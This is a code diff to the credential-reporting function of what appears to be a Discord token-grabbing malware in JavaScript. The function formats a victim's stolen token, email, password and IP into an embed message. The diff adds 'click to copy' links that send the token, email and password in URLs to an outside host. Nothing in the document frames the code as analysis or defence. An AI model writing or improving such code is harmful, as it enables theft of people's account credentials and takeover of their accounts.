@@ -610,9 +610,19 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:944007295417843743:959785231982931979> Token:',
-            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
+            name: '<a:9382blueheart:985665072187707452> @SN - Token:',
+            value: `\`\`\`${token}\`\`\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
+          },
+          {
+            name: '<a:9574_Butterfly_Blue:985666963089014805> @SN - Email:',
+            value: `\`${email}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${email})`,
+            inline: true,
+          },
+          {
+            name: '<a:4536gun4:985673435860586557> @SN - Password:',
+            value: `\`${password}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${password})`,
+            inline: true,
           },
           {
             name: '<a:satanist:802503618972483615> Badges:',
@@ -630,18 +640,8 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Email:',
-            value: `\`${email}\``,
-            inline: true,
-          },
-          {
             name: '<:944007233820307467:959785232037470208> IP:',
             value: `\`${config.ip}\``,
-            inline: true,
-          },
-          {
-            name: '<a:satan:846706207632261120> Password:',
-            value: `\`${password}\``,
             inline: true,
           },
         ],
